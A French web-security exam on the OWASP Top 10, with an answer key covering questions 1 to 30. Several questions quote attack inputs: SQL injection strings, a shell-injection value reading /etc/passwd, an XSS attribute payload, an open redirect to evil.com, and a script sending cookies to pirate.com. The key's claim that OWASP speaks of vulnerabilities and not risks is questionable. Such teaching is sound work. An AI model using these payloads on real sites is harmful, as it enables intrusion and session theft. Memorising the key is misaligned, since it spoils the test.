# Sécurité des applications (OWASP)

Nom : ______________________  Prénom : ______________________

**Question 1 — OWASP**

Qu'est-ce que l'OWASP ?

- ☐ **a.** Une certification obligatoire pour les développeurs
- ☐ **b.** Une communauté en ligne travaillant sur la sécurité des applications Web
- ☐ **c.** Un antivirus pour serveurs Web
- ☐ **d.** Un pare-feu open source

**Question 2 — Le Top 10**

Combien de grandes catégories de failles le Top 10 OWASP liste-t-il ?

Réponse : ________________________________________

**Question 3 — Vrai ou Faux - Périmètre**

Les recommandations OWASP ne s'appliquent qu'aux sites web.

☐ Vrai  ☐ Faux

**Question 4 — Confidentialité, Intégrité, Disponibilité**

Associez chaque grande catégorie de risque à un exemple.

| | À relier à… |
|---|---|
| Confidentialité → ______ | • Fuite de données personnelles |
| Intégrité → ______ | • Installation d'un antivirus sur le serveur |
| Disponibilité → ______ | • Modification non autorisée de données (injection SQL) |
|  | • Service rendu inaccessible (attaque DDoS) |
|  | • Sauvegarde quotidienne de la base de données |

**Question 5 — Surface d'attaque**

Qu'est-ce que la « surface d'attaque » d'un système ?

- ☐ **a.** L'ensemble des points d'entrée qui peuvent être exploités par un attaquant
- ☐ **b.** La superficie de la salle serveur
- ☐ **c.** Le nombre d'utilisateurs de l'application
- ☐ **d.** La taille du disque dur exposé sur Internet

**Question 6 — Faille ou risque ?**

Avec le Top 10, OWASP parle de…

- ☐ **a.** Vulnérabilités
- ☐ **b.** Incidents
- ☐ **c.** Menaces
- ☐ **d.** Risques

**Question 7 — Stockage des mots de passe**

Comment un mot de passe doit-il être stocké en base de données ?

- ☐ **a.** En clair, mais dans une table protégée par mot de passe
- ☐ **b.** Chiffré avec une clé connue de l'administrateur
- ☐ **c.** Encodé en Base64
- ☐ **d.** Haché (non réversible) et salé

**Question 8 — Une chaîne aléatoire**

Comment s'appelle la technique qui consiste à ajouter une chaîne aléatoire au mot de passe avant de le hacher ?

Réponse : ________________________________________

**Question 9 — Bcrypt**

Parmi ces affirmations sur bcrypt, laquelle est correcte ?

- ☐ **a.** Il intègre le sel et un coût (nombre d'itérations) paramétrable
- ☐ **b.** Il ne fonctionne que sur Linux
- ☐ **c.** Il est basé sur SHA-256
- ☐ **d.** C'est un algorithme de chiffrement réversible

**Question 10 — Vrai ou Faux - MD5**

Stocker un mot de passe hashé en MD5 est aujourd'hui considéré comme sécurisé.

☐ Vrai  ☐ Faux

**Question 11 — Le coût de bcrypt**

Quelle est la conséquence d'un coût (nombre d'itérations) plus élevé dans bcrypt ?

- ☐ **a.** Le hachage est plus long à calculer, ce qui le rend plus résistant aux attaques par force brute
- ☐ **b.** Le mot de passe doit être plus long
- ☐ **c.** Le sel devient inutile
- ☐ **d.** Le hash produit est plus court

**Question 12 — Les trois formes d'authentification**

Associez chaque forme d'authentification à un exemple.

| | À relier à… |
|---|---|
| Mémorielle (un secret que l'on connaît) → ______ | • Une adresse IP |
| Matérielle (un objet que l'on possède) → ______ | • Un nom d'utilisateur |
| Corporelle (un trait physique) → ______ | • Un mot de passe |
|  | • Une clé Yubikey |
|  | • Une empreinte digitale |

**Question 13 — OTP**

Que signifie l'acronyme OTP (utilisé par Google Authenticator ou Authy) ?

- ☐ **a.** One Time Password : un mot de passe à usage unique
- ☐ **b.** Optional Third Password
- ☐ **c.** Open Transfer Protocol
- ☐ **d.** Online Trusted Person

**Question 14 — Le SSO**

Quel est le principal risque du SSO (Single Sign-On) ?

- ☐ **a.** Si un compte est compromis, l'attaquant accède à toutes les applications liées à ce compte
- ☐ **b.** Il ne fonctionne pas avec le HTTPS
- ☐ **c.** Il est interdit par le RGPD
- ☐ **d.** Il oblige à retenir un mot de passe différent par application

**Question 15 — Social Engineering**

Qu'est-ce que le social engineering ?

- ☐ **a.** La manipulation de l'humain pour obtenir des informations ou des accès
- ☐ **b.** Une technique d'injection SQL avancée
- ☐ **c.** Un réseau social pour les ingénieurs en sécurité
- ☐ **d.** L'ingénierie des réseaux sociaux d'entreprise

**Question 16 — L'injection**

Une attaque par injection (SQL, OS, LDAP…) survient lorsque…

- ☐ **a.** Un utilisateur saisit un mot de passe trop court
- ☐ **b.** Des données non fiables sont envoyées à un interpréteur en tant que commande ou requête
- ☐ **c.** Un serveur n'est pas à jour
- ☐ **d.** Un cookie est stocké sans expiration

**Question 17 — Corriger l'injection SQL**

Pour se protéger des injections SQL, il faut toujours utiliser des requêtes ______ , ou un ORM qui fait la même chose.

(a) préparées / (b) concaténées / (c) rapides / (d) chiffrées

**Question 18 — Reconnaître l'attaque**

Un attaquant ouvre l'URL suivante : http://exemple.com/liste?id='or '1'='1. De quelle attaque s'agit-il ?

- ☐ **a.** Une attaque DDoS
- ☐ **b.** Une injection SQL
- ☐ **c.** Un CSRF
- ☐ **d.** Un XSS reflété

**Question 19 — Le XSS**

En quoi consiste une faille XSS (Cross-Site Scripting) ?

- ☐ **a.** Voler physiquement le serveur
- ☐ **b.** Deviner un mot de passe par force brute
- ☐ **c.** Saturer le serveur de requêtes
- ☐ **d.** Injecter du contenu (souvent du JavaScript) dans une page pour provoquer des actions non désirées

**Question 20 — Les deux types de XSS**

Quels sont les deux types de XSS à connaître ?

- ☐ **a.** Client et serveur
- ☐ **b.** Interne et externe
- ☐ **c.** Persistant (stocké en base et exécuté à chaque affichage) et reflété (via un lien)
- ☐ **d.** Statique et dynamique

**Question 21 — Échapper l'affichage**

Quelle fonction PHP est recommandée pour échapper une valeur avant de l'afficher dans une page (protection XSS) ?

Réponse : ________________________________________

**Question 22 — Vrai ou Faux - Requête préparée et XSS**

Utiliser des requêtes préparées suffit à se protéger des failles XSS.

☐ Vrai  ☐ Faux

**Question 23 — Le CSRF**

En quoi consiste une attaque CSRF (falsification de requête intersite) ?

- ☐ **a.** Modifier le DNS du serveur
- ☐ **b.** Écouter le trafic réseau non chiffré
- ☐ **c.** Injecter du SQL dans un formulaire
- ☐ **d.** Faire exécuter une requête à l'insu de l'utilisateur, en profitant de sa session active

**Question 24 — Bloquer le CSRF**

Quelle est la contre-mesure principale contre le CSRF ?

- ☐ **a.** Ajouter dans les formulaires un jeton unique et non réutilisable, vérifié côté serveur
- ☐ **b.** Utiliser des mots de passe plus longs
- ☐ **c.** Désactiver JavaScript sur le site
- ☐ **d.** Passer toutes les requêtes en GET

**Question 25 — Références directes non sécurisées**

Un site affiche http://exemple.com/liste?mode=client et un utilisateur remplace « client » par « admin » et accède aux données d'administration. Quelle est la cause du problème ?

- ☐ **a.** Le site n'utilise pas le HTTPS
- ☐ **b.** Les droits de l'utilisateur ne sont pas vérifiés côté serveur avant de charger la ressource
- ☐ **c.** La base de données n'est pas sauvegardée
- ☐ **d.** Le mot de passe de l'admin est trop faible

**Question 26 — Mauvaise configuration**

Parmi ces situations, laquelle relève de la « mauvaise configuration de sécurité » ?

- ☐ **a.** Un mot de passe utilisateur trop court
- ☐ **b.** Une console d'administration accessible en ligne sans authentification
- ☐ **c.** Une librairie JavaScript obsolète
- ☐ **d.** Un email de phishing envoyé aux employés

**Question 27 — Composants vulnérables**

Pourquoi un CMS ou un framework non mis à jour représente-t-il une faille ?

- ☐ **a.** Parce qu'il devient plus lent avec le temps
- ☐ **b.** Ses vulnérabilités sont connues et documentées publiquement, un attaquant peut les exploiter directement
- ☐ **c.** Ce n'est pas une faille tant que le site fonctionne
- ☐ **d.** Parce que sa licence expire

**Question 28 — Redirections non validées**

Un attaquant diffuse le lien http://www.shop-vdt.com/login.php?goto=evil.com/login. Quel est l'objectif de cette attaque ?

- ☐ **a.** Injecter du SQL dans la page de login
- ☐ **b.** Voler le certificat SSL du site
- ☐ **c.** Utiliser un site légitime comme « masque » pour rediriger la victime vers une page malveillante (phishing)
- ☐ **d.** Saturer le serveur shop-vdt.com

**Question 29 — Supply Chain Attack**

En quoi consiste une Supply Chain Attack ?

- ☐ **a.** Attaquer les camions de livraison d'une entreprise
- ☐ **b.** Compromettre une dépendance logicielle (npm, composer, pip…) pour distribuer un malware aux applications qui l'utilisent
- ☐ **c.** Intercepter les emails entre deux entreprises
- ☐ **d.** Voler les identifiants d'un fournisseur d'électricité

**Question 30 — Vrai ou Faux - Session dans l'URL**

Transmettre l'identifiant de session en paramètre GET (http://exemple.com/?jsessionid=A2938…) est une pratique sûre.

☐ Vrai  ☐ Faux

**Question 31 — Vrai ou Faux - Secrets**

Il est acceptable d'écrire une clé API en dur dans le code source tant que le dépôt Git est privé.

☐ Vrai  ☐ Faux

**Question 32 — Gérer les secrets**

Quelle est la bonne pratique pour gérer les secrets (clés API, mots de passe de BDD) d'une application ?

- ☐ **a.** Les encoder en Base64 dans le code
- ☐ **b.** Les envoyer par email à chaque développeur
- ☐ **c.** Les placer dans un fichier .env exclu du versioning, ou dans des variables d'environnement
- ☐ **d.** Les placer dans un fichier config.php commité avec le projet

**Question 33 — Scanner les secrets**

Citez un outil vu en cours permettant de détecter des secrets commités dans un dépôt Git.

Réponse : ________________________________________

**Question 34 — Le JWT**

Le payload d'un JWT n'est pas chiffré, il est simplement encodé en ______ , il ne faut donc jamais y stocker d'informations sensibles.

(a) AES / (b) Base64 / (c) SHA-256 / (d) bcrypt

**Question 35 — Transmettre un token**

Comment un client doit-il transmettre son token à une API ?

- ☐ **a.** Dans le nom d'utilisateur
- ☐ **b.** En commentaire HTML dans la page
- ☐ **c.** Dans le header Authorization (Bearer)
- ☐ **d.** En paramètre GET dans l'URL

**Question 36 — Rate Limiting**

À quoi sert le rate limiting sur un endpoint d'authentification ?

- ☐ **a.** À mettre en cache les réponses
- ☐ **b.** À limiter le nombre d'appels pour bloquer les attaques par force brute
- ☐ **c.** À compresser les réponses de l'API
- ☐ **d.** À chiffrer les requêtes

**Question 37 — Les headers de sécurité**

Associez chaque header HTTP à son rôle.

| | À relier à… |
|---|---|
| Content-Security-Policy → ______ | • Forcer le navigateur à n'utiliser que HTTPS |
| Strict-Transport-Security → ______ | • Mettre la page en cache côté navigateur |
| X-Frame-Options → ______ | • Empêcher le navigateur de deviner le type MIME |
| X-Content-Type-Options → ______ | • Compresser la réponse HTTP |
|  | • Limiter les sources de scripts et de contenu (protection XSS) |
|  | • Empêcher le clickjacking |

**Question 38 — Cookies sécurisés**

Quels attributs doit-on poser sur un cookie de session pour le sécuriser ? (plusieurs réponses attendues)

*Plusieurs réponses possibles.*

- ☐ **a.** Base64
- ☐ **b.** SameSite=Strict (ou Lax)
- ☐ **c.** Secure
- ☐ **d.** Public
- ☐ **e.** HttpOnly

**Question 39 — Les outils OWASP**

À quoi sert l'outil OWASP ZAP (Zed Attack Proxy) ?

- ☐ **a.** À héberger des sites Web sécurisés
- ☐ **b.** À auditer la sécurité d'une application Web en testant ses vulnérabilités
- ☐ **c.** À vérifier les dépendances vulnérables
- ☐ **d.** À se former à la sécurité sur une application volontairement vulnérable

**Question 40 — DevSecOps**

Que signifie l'approche « shift-left » en DevSecOps ?

- ☐ **a.** Intégrer la sécurité dès la phase de développement, pas seulement en production
- ☐ **b.** Déplacer les serveurs vers la gauche du rack
- ☐ **c.** Confier la sécurité uniquement à l'équipe production
- ☐ **d.** Faire les audits de sécurité après la mise en production

**Question 41 — Le faux ami**

Un développeur pense avoir corrigé une injection SQL avec ce code :
$request = "SELECT * FROM users WHERE id = $id";
$pdo-&gt;prepare($request)-&gt;execute();
Pourquoi la faille est-elle toujours présente ?

- ☐ **a.** La donnée est collée dans la chaîne avant le prepare(), elle fait déjà partie du texte SQL
- ☐ **b.** Parce que la variable $id n'est pas entourée d'apostrophes
- ☐ **c.** Parce que prepare() ne protège que les requêtes INSERT
- ☐ **d.** Parce qu'il faudrait utiliser query() à la place de prepare()

**Question 42 — Une recherche avec LIKE**

Pour une recherche sécurisée, on écrit la requête SELECT * FROM articles WHERE title LIKE ? et on place les caractères % ______ .

(a) autour du ? dans la requête, entre apostrophes / (b) dans la donnée passée à execute() / (c) dans le nom de la colonne / (d) dans un second appel à prepare()

**Question 43 — Le placeholder entre guillemets**

Que se passe-t-il à l'exécution de ce code d'inscription ?
$request = "INSERT INTO users (name, email) VALUES ('?', '?')";
$pdo-&gt;prepare($request)-&gt;execute([$name, $email]);

- ☐ **a.** La requête est vulnérable à l'injection SQL
- ☐ **b.** L'utilisateur est inséré correctement et la requête est sécurisée
- ☐ **c.** PDO lève une exception (Invalid parameter number) et rien n'est inséré, c'est un bug et non une faille
- ☐ **d.** L'utilisateur est inséré avec le nom « ? » et l'email « ? »

**Question 44 — Vrai ou Faux - Injection à l'aveugle**

Une page qui répond seulement « Compte trouvé » ou « Compte inconnu », sans jamais afficher de données ni d'erreur SQL, est protégée contre l'injection SQL.

☐ Vrai  ☐ Faux

**Question 45 — Les techniques d'injection**

Associez chaque saisie injectée à la technique qu'elle illustre.

| | À relier à… |
|---|---|
| admin' -- → ______ | • Exécuter du JavaScript dans le navigateur de la victime |
| 1 OR 1=1 → ______ | • Recoller les colonnes d'une autre table dans le résultat affiché |
| ' UNION SELECT login, password FROM users -- → ______ | • Enchaîner une seconde requête qui modifie la base |
| 1; UPDATE users SET role='admin' → ______ | • Deviner un mot de passe en testant un dictionnaire |
|  | • Contourner une connexion en mettant en commentaire la vérification du mot de passe |
|  | • Rendre une condition toujours vraie pour récupérer toutes les lignes |

**Question 46 — L'injection shell**

Le code system("ls " . $_GET['dossier']); permet d'exécuter n'importe quelle commande en envoyant dossier=; cat /etc/passwd. Quelle fonction PHP faut-il appliquer à la saisie pour qu'elle reste un simple argument de la commande ?

Réponse : ________________________________________

**Question 47 — L'inclusion de fichier**

Une page contient include $_GET['page'] . '.php'; pour afficher index.php?page=accueil. Un attaquant affiche ainsi config.php. Comment corriger cette faille ?

- ☐ **a.** Utiliser require à la place de include
- ☐ **b.** Échapper la saisie avec htmlspecialchars
- ☐ **c.** Ajouter l'extension .php à la fin du chemin
- ☐ **d.** Vérifier la page demandée dans une liste blanche de pages autorisées (in_array) avant de l'inclure

**Question 48 — L'attribut piégé**

Une page construit une balise image dont l'attribut src reprend la saisie de l'utilisateur, sans filtre. Un visiteur saisit :
https://exemple.com/chat.jpg" onload="alert('Coucou')
Pourquoi le JavaScript s'exécute-t-il ?

- ☐ **a.** Parce qu'un navigateur exécute toujours l'attribut src d'une image comme du JavaScript
- ☐ **b.** Le guillemet ferme l'attribut src, puis la saisie ajoute un attribut onload qui contient du JavaScript
- ☐ **c.** Parce que alert() est autorisé par défaut dans les formulaires
- ☐ **d.** Parce que l'image est hébergée sur un site en HTTPS

**Question 49 — Vrai ou Faux - XSS réfléchie**

Une XSS réfléchie (le code voyage dans l'URL ou dans la saisie) touche automatiquement tous les visiteurs du site.

☐ Vrai  ☐ Faux

**Question 50 — La page de commentaires**

Une page enregistre les commentaires avec INSERT INTO comments (content) VALUES (?) et execute([$content]), puis les affiche avec echo $comment['content'] dans un formulaire écrit &lt;form&gt; sans attribut. Quels sont les problèmes de ce code ? (plusieurs réponses attendues)

*Plusieurs réponses possibles.*

- ☐ **a.** Le formulaire n'a ni method="post" ni action, il envoie en GET et $_POST['content'] reste vide
- ☐ **b.** L'insertion est vulnérable à l'injection SQL
- ☐ **c.** Les commentaires sont réaffichés sans échappement : c'est une XSS stockée
- ☐ **d.** Il faudrait remplacer la requête préparée par une concaténation pour pouvoir échapper

**Question 51 — Les fonctions de protection**

Associez chaque fonction PHP à son rôle.

| | À relier à… |
|---|---|
| htmlspecialchars() → ______ | • Transformer les caractères spéciaux en entités HTML pour qu'ils s'affichent comme du texte |
| strip_tags() → ______ | • Supprimer purement et simplement les balises HTML |
| escapeshellarg() → ______ | • Transmettre une saisie comme un simple argument à une commande shell |
| hash_equals() → ______ | • Comparer deux secrets en temps constant |
|  | • Bloquer automatiquement les requêtes venant d'un autre site |
|  | • Chiffrer un mot de passe de façon réversible |

**Question 52 — Le vol de session**

Un attaquant réussit à injecter ce JavaScript dans une page :
new Image().src = "http://pirate.com/?c=" + document.cookie;
Que fait ce code ?

- ☐ **a.** Il affiche l'image du site pirate.com dans la page
- ☐ **b.** Il supprime le cookie de session de la victime
- ☐ **c.** Il envoie discrètement le cookie de session de la victime vers le serveur de l'attaquant, qui peut se connecter à sa place
- ☐ **d.** Rien, un navigateur bloque toujours les images venant d'un autre domaine

**Question 53 — Vrai ou Faux - Filtre naïf**

Un site qui retire toutes les balises &lt;script&gt; des saisies est protégé contre les XSS.

☐ Vrai  ☐ Faux

**Question 54 — Où protéger ?**

Contre une XSS stockée, quelle solution le TP 2 recommande-t-il ?

- ☐ **a.** Stocker la saisie brute et l'échapper avec htmlspecialchars au moment de l'afficher
- ☐ **b.** Supprimer les balises avec strip_tags avant l'enregistrement
- ☐ **c.** Utiliser une requête préparée pour l'insertion
- ☐ **d.** Chiffrer les commentaires en base de données

**Question 55 — Lire les logs**

Dans le journal d'accès, la même adresse IP demande /facture?id=8986, puis 8987, 8988, 8989 et 8990 dans la même seconde. Que révèle cette suite ?

- ☐ **a.** Une énumération : l'utilisateur teste les identifiants les uns après les autres pour trouver des factures qui ne sont pas les siennes
- ☐ **b.** Une injection SQL dans le paramètre id
- ☐ **c.** Une attaque par déni de service (DDoS)
- ☐ **d.** Un utilisateur qui recharge sa page de facture

**Question 56 — Le nom de la faille**

Un utilisateur connecté lit la facture d'un autre client en changeant simplement le numéro dans l'URL. Quel acronyme (Insecure Direct Object Reference) désigne cette faille ?

Réponse : ________________________________________

**Question 57 — Le bon code HTTP**

Après correction du contrôleur, quel code HTTP doit renvoyer une demande portant sur une facture qui existe mais qui appartient à un autre utilisateur ?

Réponse : ________________________________________

**Question 58 — Contrôler une facture**

Dans FactureController, que doit vérifier le serveur avant d'afficher une facture demandée par son identifiant ? (plusieurs réponses attendues)

*Plusieurs réponses possibles.*

- ☐ **a.** Que l'identifiant est difficile à deviner
- ☐ **b.** Que la facture appartient à l'utilisateur connecté (user_id comparé à Auth::id(), sinon 403)
- ☐ **c.** Que la requête est préparée
- ☐ **d.** Que la facture existe (sinon 404)

**Question 59 — Le middleware**

Dans Laravel, qu'est-ce qu'un middleware comme admin appliqué à un groupe de routes ?

- ☐ **a.** Une table de la base de données qui stocke les administrateurs
- ☐ **b.** Une vue Blade réservée aux administrateurs
- ☐ **c.** Un filtre exécuté avant le contrôleur, qui laisse passer la requête ou la bloque (redirection ou 403)
- ☐ **d.** Un fichier de logs qui enregistre les accès aux pages d'administration

**Question 60 — La route oubliée**

Un développeur ajoute Route::get('/admin/factures', 'FactureController@all') à la fin du fichier web.php, en dehors du groupe Route::middleware(['admin']). Quelle est la conséquence ?

- ☐ **a.** Laravel refuse de démarrer car la route est mal placée
- ☐ **b.** La page qui liste les factures de tous les utilisateurs est accessible sans être administrateur
- ☐ **c.** La route est protégée car son URL commence par /admin
- ☐ **d.** La route hérite automatiquement du middleware des autres routes /admin

**Question 61 — Analyser les logs**

En production, le volume des journaux est énorme : le repérage des accès anormaux doit être ______ , c'est l'enjeu de la catégorie A09 de l'OWASP.

(a) automatisé, avec une alerte / (b) manuel, en lisant les logs chaque matin / (c) confié aux utilisateurs du site / (d) désactivé pour ne pas ralentir le serveur

**Question 62 — Vérifier un mot de passe**

À l'inscription on stocke password_hash($password, PASSWORD_DEFAULT). À la connexion, on vérifie le mot de passe saisi avec la fonction ______ .

(a) md5 / (b) password_decrypt / (c) password_compare / (d) password_verify

**Question 63 — Ne pas filtrer le mot de passe**

Pourquoi ne faut-il pas appliquer filter_input(..., FILTER_SANITIZE_SPECIAL_CHARS) sur un mot de passe avant de le hacher ?

- ☐ **a.** Le filtre altère des caractères légitimes (&lt;, &, "): le mot de passe stocké n'est plus celui saisi et il est affaibli
- ☐ **b.** Parce que filter_input n'existe plus depuis PHP 8
- ☐ **c.** Parce que password_hash refuse les chaînes filtrées
- ☐ **d.** Il faut au contraire toujours le filtrer avant de le hacher

**Question 64 — Reconnaître un hash**

Après correction du TP 4, laquelle de ces valeurs peut-on trouver dans la colonne password de la table users ?

- ☐ **a.** YWRtaW5TdXBlck1vdERlUGFzc2U=
- ☐ **b.** $2y$10$Kq3eX2vB0cQh8mN1rT5uLe8yZ4pW6sA9dF7gH2jK3lM0nO1pQ2rS
- ☐ **c.** 21232f297a57a5a743894a0e4a801fc3
- ☐ **d.** adminSuperMotDePasse

**Question 65 — Le bruteforce**

Quel est l'objectif d'une limite de tentatives et d'un délai entre les essais sur un formulaire de connexion ?

- ☐ **a.** Empêcher les injections SQL dans le formulaire
- ☐ **b.** Rendre l'attaque totalement impossible
- ☐ **c.** Chiffrer le mot de passe pendant son transport
- ☐ **d.** Rendre l'attaque par force brute trop lente pour être rentable

**Question 66 — Limiter par IP**

Le TP 4 compte les tentatives de connexion dans $_SESSION. Pourquoi faut-il, en production, limiter aussi par adresse IP ?

- ☐ **a.** Ce n'est pas nécessaire, la session suffit
- ☐ **b.** Parce qu'un attaquant peut vider ses cookies et repartir avec une session neuve, donc un compteur remis à zéro
- ☐ **c.** Parce que $_SESSION ne fonctionne pas sur un formulaire de connexion
- ☐ **d.** Parce que l'adresse IP permet de retrouver le mot de passe

**Question 67 — Vrai ou Faux - Supprimer en GET**

Une page admin.php?id=1 qui supprime un utilisateur en GET est sûre, puisque seul un administrateur connecté peut l'utiliser.

☐ Vrai  ☐ Faux

**Question 68 — Le POST ne suffit pas**

Après le passage de la suppression en POST, pourquoi faut-il encore ajouter un jeton anti-CSRF ?

- ☐ **a.** Parce que le POST est moins rapide que le GET
- ☐ **b.** Il ne faut pas, le POST suffit à bloquer toute attaque CSRF
- ☐ **c.** Parce qu'un site piégé peut contenir un formulaire POST soumis automatiquement vers votre site, avec la session de la victime
- ☐ **d.** Parce que le jeton remplace le mot de passe de l'administrateur

**Question 69 — Comparer un jeton**

Pourquoi le cours recommande-t-il hash_equals() plutôt que === pour comparer le jeton CSRF reçu à celui de la session ?

- ☐ **a.** Parce que === ne fonctionne pas sur les chaînes hexadécimales
- ☐ **b.** Parce que hash_equals() est plus rapide
- ☐ **c.** Parce que hash_equals() déchiffre le jeton avant de le comparer
- ☐ **d.** Pour éviter une attaque temporelle : === s'arrête au premier caractère différent, et le temps de réponse trahit le nombre de caractères corrects

**Question 70 — La fixation de session**

Quelle fonction PHP, appelée juste après une connexion réussie, change l'identifiant de session et protège ainsi contre la fixation de session ?

Réponse : ________________________________________

**Question 71 — Le code TOTP**

Le code de double authentification (TOTP) est recalculé par le téléphone et par le serveur à partir du même secret et de l'heure. Toutes les combien de secondes change-t-il ?

Réponse : ________________________________________

**Question 72 — Mot de passe oublié**

Un site vous renvoie par email votre mot de passe oublié, en clair. Qu'en déduisez-vous ?

- ☐ **a.** C'est normal, le hachage permet de retrouver le mot de passe d'origine
- ☐ **b.** C'est très mauvais signe : le site stocke le mot de passe en clair ou de façon réversible
- ☐ **c.** C'est sans risque tant que l'email est envoyé en HTTPS
- ☐ **d.** C'est bon signe : le site a bien sauvegardé votre mot de passe

**Question 73 — Le Top 10 2025**

Associez chaque code du Top 10 OWASP 2025 à sa catégorie.

| | À relier à… |
|---|---|
| A01 → ______ | • Contrôles d'accès défaillants (dont IDOR, CSRF, SSRF) |
| A03 → ______ | • Mauvaise gestion des sauvegardes |
| A05 → ______ | • Injection (SQL, OS, XSS…) |
| A09 → ______ | • Absence d'antivirus sur le serveur |
|  | • Défaillances de la chaîne d'approvisionnement logicielle |
|  | • Carence de journalisation et d'alerte |

**Question 74 — Fail open**

Que reprocher à ce code ?
try { $isAdmin = checkAdmin($user); } catch (Exception $e) { $isAdmin = true; }

- ☐ **a.** Rien, ce code est correct
- ☐ **b.** En cas d'erreur, tout le monde devient administrateur : c'est un comportement « fail open », il faut refuser l'accès par défaut
- ☐ **c.** Le bloc try est inutile, checkAdmin ne lève jamais d'exception
- ☐ **d.** Il manque un finally pour fermer la connexion

**Question 75 — Un script depuis un CDN**

Pour que le navigateur vérifie qu'un script chargé depuis un CDN n'a pas été modifié, on ajoute à la balise script l'attribut ______ contenant l'empreinte du fichier (sha384-...).

(a) crossorigin / (b) defer / (c) integrity / (d) async

**Question 76 — Un panier dans un cookie**

Une page exécute $panier = unserialize($_COOKIE['panier']);. Quel est le problème et sa correction ?

- ☐ **a.** Il suffit d'encoder le cookie en Base64
- ☐ **b.** Le cookie est trop gros, il faut le compresser
- ☐ **c.** unserialize est trop lent, il faut le mettre en cache
- ☐ **d.** Le cookie est modifiable par le visiteur et unserialize peut créer des objets : on utilise json_decode et on valide le contenu

**Question 77 — Durcir la configuration**

Quelles mesures corrigent une mauvaise configuration de sécurité (A02) ? (plusieurs réponses attendues)

*Plusieurs réponses possibles.*

- ☐ **a.** Supprimer les exemples de code et les répertoires de debug
- ☐ **b.** Passer display_errors à Off et garder les erreurs dans les logs (log_errors = On)
- ☐ **c.** Désactiver le listage des répertoires (Options -Indexes)
- ☐ **d.** Activer Options +Indexes pour faciliter l'accès aux fichiers
- ☐ **e.** Activer display_errors pour diagnostiquer plus vite les problèmes en production

**Question 78 — Installer les dépendances**

Pour installer exactement les versions validées (fichiers lock versionnés) puis rechercher les vulnérabilités connues, quelles commandes utiliser ?

- ☐ **a.** Supprimer le fichier composer.lock pour toujours avoir la dernière version
- ☐ **b.** composer install (ou npm ci) puis composer audit (ou npm audit)
- ☐ **c.** composer update (ou npm update) à chaque déploiement
- ☐ **d.** Indiquer "*" comme version de chaque dépendance dans composer.json

**Question 79 — Conception non sécurisée**

Une page de réinitialisation demande « Quelle est votre couleur préférée ? » avant de changer le mot de passe. Par quoi faut-il la remplacer ?

- ☐ **a.** Un captcha seul
- ☐ **b.** Une question plus difficile, comme la date de naissance
- ☐ **c.** Un lien unique et temporaire envoyé par email
- ☐ **d.** Une réponse stockée en clair pour pouvoir la vérifier

**Question 80 — L'IA et les dépendances**

Un assistant IA propose d'installer un paquet qui n'existe pas. Un attaquant publie ensuite un paquet malveillant portant ce nom inventé. Comment appelle-t-on cette attaque ?

- ☐ **a.** Le phishing
- ☐ **b.** Le slopsquatting, une forme de Supply Chain Attack
- ☐ **c.** Le clickjacking
- ☐ **d.** L'injection SQL


<div style="page-break-before: always;"></div>

## Corrigé

**1.** (b) Une communauté en ligne travaillant sur la sécurité des applications Web — *Exact, elle publie des recommandations et des outils libres et ouverts à tous.*

**2.** 10 — *Exact, d'où son nom de « Top 10 ».*

**3.** Faux — *Exact, c'est faux : elles s'appliquent à toutes les applications, pas seulement aux sites web.*

**4.** Confidentialité → Fuite de données personnelles ; Intégrité → Modification non autorisée de données (injection SQL) ; Disponibilité → Service rendu inaccessible (attaque DDoS)

**5.** (a) L'ensemble des points d'entrée qui peuvent être exploités par un attaquant — *Exact, la réduire consiste à minimiser les points d'entrée.*

**6.** (a) Vulnérabilités — *Exact, OWASP parle de vulnérabilité, et non de risque.*

**7.** (d) Haché (non réversible) et salé — *Exact, jamais en clair, et le sel rend chaque hash unique.*

**8.** le salage (accepté aussi : salage, salt)

**9.** (a) Il intègre le sel et un coût (nombre d'itérations) paramétrable — *Exact, plus le coût est élevé, plus le hachage est long à calculer, donc plus il résiste au brute-force.*

**10.** Faux — *Exact, c'est faux : le cours cite le MD5 comme un exemple d'exposition de données sensibles, au même titre que le stockage en clair.*

**11.** (a) Le hachage est plus long à calculer, ce qui le rend plus résistant aux attaques par force brute — *Exact, c'est un compromis entre performance et sécurité.*

**12.** Mémorielle (un secret que l'on connaît) → Un mot de passe ; Matérielle (un objet que l'on possède) → Une clé Yubikey ; Corporelle (un trait physique) → Une empreinte digitale

**13.** (a) One Time Password : un mot de passe à usage unique — *Exact, il change à chaque utilisation ou toutes les 30 secondes.*

**14.** (a) Si un compte est compromis, l'attaquant accède à toutes les applications liées à ce compte — *Exact, d'où l'importance de le combiner avec du multi-facteurs (2FA, MFA).*

**15.** (a) La manipulation de l'humain pour obtenir des informations ou des accès — *Exact, l'humain est le maillon faible : la contre-mesure est la formation régulière.*

**16.** (b) Des données non fiables sont envoyées à un interpréteur en tant que commande ou requête — *Exact, c'est la définition de la catégorie A05 du Top 10 (version 2025).*

**17.** (a) préparées

**18.** (b) Une injection SQL — *Exact, la condition '1'='1' étant toujours vraie, la requête retourne toutes les lignes de la table.*

**19.** (d) Injecter du contenu (souvent du JavaScript) dans une page pour provoquer des actions non désirées — *Exact, par exemple en saisissant &lt;script&gt;…&lt;/script&gt; dans un champ affiché sans échappement.*

**20.** (c) Persistant (stocké en base et exécuté à chaque affichage) et reflété (via un lien) — *Exact.*

**21.** htmlspecialchars (accepté aussi : htmlspecialchars())

**22.** Faux — *Exact, c'est faux : la requête préparée protège des injections SQL. Contre le XSS, il faut échapper les données à l'affichage (htmlspecialchars).*

**23.** (d) Faire exécuter une requête à l'insu de l'utilisateur, en profitant de sa session active — *Exact, par exemple un lien piégé qui déclenche une action sur un site où il est connecté.*

**24.** (a) Ajouter dans les formulaires un jeton unique et non réutilisable, vérifié côté serveur — *Exact, c'est le csrf_token intégré de base dans Laravel.*

**25.** (b) Les droits de l'utilisateur ne sont pas vérifiés côté serveur avant de charger la ressource — *Exact, et notez qu'une requête préparée n'empêche pas ce danger.*

**26.** (b) Une console d'administration accessible en ligne sans authentification — *Exact, comme le listage des répertoires, les exemples de code non supprimés ou une application laissée en mode debug.*

**27.** (b) Ses vulnérabilités sont connues et documentées publiquement, un attaquant peut les exploiter directement — *Exact, c'est la catégorie « composants avec des vulnérabilités connues ».*

**28.** (c) Utiliser un site légitime comme « masque » pour rediriger la victime vers une page malveillante (phishing) — *Exact, la contre-mesure est de filtrer et valider les destinations de redirection.*

**29.** (b) Compromettre une dépendance logicielle (npm, composer, pip…) pour distribuer un malware aux applications qui l'utilisent — *Exact, l'attaque ne vise pas directement votre code mais une dépendance, comme la faille Log4Shell en 2021.*

**30.** Faux — *Exact, c'est faux : si le lien est partagé, n'importe qui obtient l'accès. Les paramètres d'URL restent aussi dans l'historique et les logs.*

